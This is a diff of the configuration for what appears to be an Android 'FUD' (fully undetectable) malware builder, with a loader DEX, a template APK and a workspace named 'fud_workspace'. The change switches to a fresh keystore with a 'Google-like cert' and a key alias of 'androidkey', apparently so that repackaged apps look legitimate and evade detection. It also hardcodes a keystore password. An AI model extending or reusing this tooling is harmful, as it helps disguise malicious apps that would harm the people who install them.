@@ -14,11 +14,13 @@ ZIPALIGN_BIN  = os.path.join(BT_DIR, "zipalign")
 D8_BIN        = os.path.join(BT_DIR, "d8")
 ANDROID_JAR   = os.path.join(TOOLS_DIR, "platforms", "android-34", "android.jar")
 
-KEYSTORE_PATH = os.path.join(TOOLS_DIR, "release.p12")
+# NEW filename → forces fresh keystore with Google-like cert
+KEYSTORE_PATH = os.path.join(TOOLS_DIR, "release_play.p12")
 KEYSTORE_PASS = "fudbot123"
-KEY_ALIAS     = "fudkey"
+KEY_ALIAS     = "androidkey"
 
-WORK_DIR = os.path.join(_HOME, "fud_workspace")
+WORK_DIR     = os.path.join(_HOME, "fud_workspace")
+TEMPLATE_APK = os.path.join(WORK_DIR, "template.apk")
 
 LOADER_SRC_DIR = os.path.join(TOOLS_DIR, "loader_src")
 LOADER_DEX     = os.path.join(TOOLS_DIR, "loader.dex")
@@ -37,4 +39,3 @@ URL_JRE        = "https://github.com/adoptium/temurin17-binaries/releases/downlo
 URL_ECJ        = "https://repo1.maven.org/maven2/org/eclipse/jdt/ecj/3.33.0/ecj-3.33.0.jar"
 URL_APKTOOL    = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
 URL_BUILDTOOLS = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
-URL_PLATFORM   = "https://dl.google.com/android/repository/platform-34_r03.zip"
